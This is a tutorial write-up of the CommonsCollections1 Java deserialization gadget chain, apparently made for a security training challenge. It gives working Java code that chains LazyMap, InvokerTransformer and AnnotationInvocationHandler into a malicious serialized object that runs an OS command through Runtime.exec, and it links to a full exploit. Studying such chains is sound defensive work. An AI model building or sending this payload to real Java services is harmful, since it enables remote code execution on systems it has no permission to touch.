# Java deserialization vul. in CommonCollections library version 3.1.2

Author: lamnc2





### Target's requirements

- Java Object Deserialization Vulnerability
- `common-collections:3.1.2` library





### A quick look on used classes

From JDK:

1. **AnnotationInvocationHandler**.

2. InvocationHandler

3. Proxy

   

4. Map

5. Override

6. Runtime: executes os's command



From Commons Collections (library provides data structures):

1. **LazyMap**:

   Decorates another `Map` to create objects in the map on demand.

   When the [`get(Object)`](https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/map/LazyMap.html#get(java.lang.Object)) method is called with a key that does not exist in the map, the factory is used to create the object. The created object will be added to the map using the requested key.

2. Transformer.

3. **ChainedTransformer**:

   Transformer implementation that chains the specified transformers together.

   The input object is passed to the first transformer. The transformed result is passed to the second transformer and so on

4. **InvokerTransformer**

   `getInstance(String, Class[], Object[])`: Gets an instance of this transformer calling a specific method with specific values

   ![image-20200315161109601](C:\Users\Lam Nguyen\AppData\Roaming\Typora\typora-user-images\image-20200315161109601.png)





### Gadget idea & Build payload

#### Execute OS's commands using `LazyMap` and `ChainedTransformer`

##### Idea:

1. Prepare `chainedTransformer` to execute OS's command when calling `chainedTransformer.transform()` method. 

   Sample code:

   ```java
   String[] command = {"calc"};
   final Transformer[] transformers = new Transformer[]{
       new ConstantTransformer(Runtime.class), //(1)
       new InvokerTransformer("getMethod",
                              new Class[]{ String.class, Class[].class},
                              new Object[]{"getRuntime", new Class[0]}
                             ), //(2)
       new InvokerTransformer("invoke",
                              new Class[]{Object.class, Object[].class},
                              new Object[]{null, new Object[0]}
                             ), //(3)
       new InvokerTransformer("exec",
                              new Class[]{String.class},
                              command
                             ) //(4)
   };
   ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
   ```

   

   Procedure of `chainedTransformer.transform()`:

   <img src="https://3.bp.blogspot.com/-w1dB15DnaTE/VoR6edXrAHI/AAAAAAAAA-o/gcu2isnMz8U/s400/InvokerTransformer-3.png" alt="img"  />



2. Prepare LazyMap with the instance of chainedTransformer:

   `Map map = new HashMap<>();`
   `Map lazyMap = LazyMap.decorate(map, chainedTransformer)`

   

3. When LazyMap retrieve value of non-existed key, for example `lazyMap.get("<not existed value>")`:

   1. It sets a new value for that key with `LazyMap.factory.transform()`

      ![image-20200316162101403](C:\Users\Lam Nguyen\AppData\Roaming\Typora\typora-user-images\image-20200316162101403.png)

      

   2. The `LazyMap.factory` is the instance of chainedTransformer; Thus, method `ChainedTransformer.transform()` is called -> **OS's command execution**

      ![image-20200316162433874](C:\Users\Lam Nguyen\AppData\Roaming\Typora\typora-user-images\image-20200316162433874.png)



##### Code:

- ```java
  // RCE with LazyMap and ChainedTransformer
  String[] command = {"calc"};
  final Transformer[] transformers = new Transformer[]{
  
      new ConstantTransformer(Runtime.class),
  
      new InvokerTransformer("getMethod",
                             new Class[]{ String.class, Class[].class},
                             new Object[]{"getRuntime", new Class[0]}
                            ),
  
      new InvokerTransformer("invoke",
                             new Class[]{Object.class, Object[].class},
                             new Object[]{null, new Object[0]}
                            ),
  
      new InvokerTransformer("exec",
                             new Class[]{String.class},
                             command
                            )
  };
  
  ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
  
  Map map = new HashMap();
  Map lazyMap = LazyMap.decorate(map, chainedTransformer);
  
  lazyMap.get("gursev"); // try to get non-existed key in the map
  ```

  





#### Deserialization to OS's command execution: chain from `InputStream.readObject()` to `LazyMap.get(<non-existed key>)`

> Quick review on Dynamic Proxy API
>
> - Function: routes all method invocations to a single handler – the *invoke()* method.
>
> - Each proxy instance **has an associated** **invocation handler**, the one that was passed to its constructor. 
>
>   - A class represent invocation handler implements InvocationHandler interface
>   - When method is invoked on a proxy instance, the method invocation is encoded and dispatched to the invoke method of its invocation handler
>
> - Create a Proxy: 
>
>   ```java
>   Proxy.newInstance(Classloader of the class represents invocation handler ,
>   					Class[] interfaces which methods are routed, 
>   					instance of InvocationHandler to dispatch method to)
>   ```



##### Idea:

This gadget chain composes by 2 elements

**Element 1** - The use of `AnnotationInvocationHandler`:

- Purpose: be the malicious serialized object.

- It has property of `Map` type: `memberValues`

  <img src="C:\Users\Lam Nguyen\AppData\Roaming\Typora\typora-user-images\image-20200316163249110.png" alt="image-20200316163249110" style="zoom:67%;" />
  
  Initiate `memberValues` in constructor:
  
  <img src="C:\Users\Lam Nguyen\AppData\Roaming\Typora\typora-user-images\image-20200316233716493.png" alt="image-20200316233716493" style="zoom: 67%;" />
  
  
  
- Its `readObject()` retrieve value of `Map memberValues` which could be chained to `LazyMap.get()` by using a `Proxy`.

  <img src="C:\Users\Lam Nguyen\AppData\Roaming\Typora\typora-user-images\image-20200316163548972.png" alt="image-20200316163548972" style="zoom: 50%;" />



**Element 2** - The use of `Proxy`

- Purpose: methods of an abstract `Map` (e.g.: `HashMap.get()`) –routed to–> methods of `LazyMap` (`LazyMap.get()` method).

- Invocation Handler: An instance of `AnnotaionInvocationHandler`



##### Workflow:

​	![Exploit Flow](I:\Current working projects\VCS Trainning\Challenge 5\Exploit Flow.png)



##### Code:

- ```java
  String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
  
  //Element 2
  final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
  constructor.setAccessible(true);
  InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
  Proxy evilProxy = (Proxy) Proxy.newProxyInstance(CommonsCollections1All.class.getClassLoader(), new Class[] {Map.class}, secondInvocationHandler );
  
  //Element 1
  InvocationHandler invocationHandlerToSerialize = (InvocationHandler) constructor.newInstance(Override.class, evilProxy);
  ```






#### Put it all together

*Building payload: Create malicious serialized object.*



##### Gadget chain:

```java
Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()
```



##### Pseudo code:

```java
package com.deserialize.payload;

import ...;

public class CommonsCollections1All {

    public static void main(String... args) {
        Object evilObject = getEvilObject();
        byte[] serializedObject = serializeToByteArray(evilObject); // Payload: Malicious serialized object
	}

    public static Object getEvilObject() {
        
        // RCE with LazyMap and ChainedTransformer
        String[] command = {"..."};
        final Transformer[] transformers = new Transformer[]{

                new ConstantTransformer(Runtime.class),

                new InvokerTransformer(), 

                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        command
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);
        

        //Chain from deserialization to LazyMap.get()      
        //		Create instance of AnnotationInvocationHandler: 
        final Constructor<?> constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
        Proxy evilProxy = (Proxy) Proxy.newProxyInstance(CommonsCollections1All.class.getClassLoader(), new Class[] {Map.class}, secondInvocationHandler );

        InvocationHandler invocationHandlerToSerialize = (InvocationHandler) constructor.newInstance(Override.class, evilProxy);
        return invocationHandlerToSerialize;
 	}

    public static byte[] serializeToByteArray(Object object){}    
}
```



##### Full code:

Github: https://github.com/kiven7299/Java-Deserialization/blob/master/CommonsCollections1All.java





#### References

- https://www.baeldung.com/java-dynamic-proxies

- https://gursevkalra.blogspot.com/2016/01/ysoserial-commonscollections1-exploit.html

  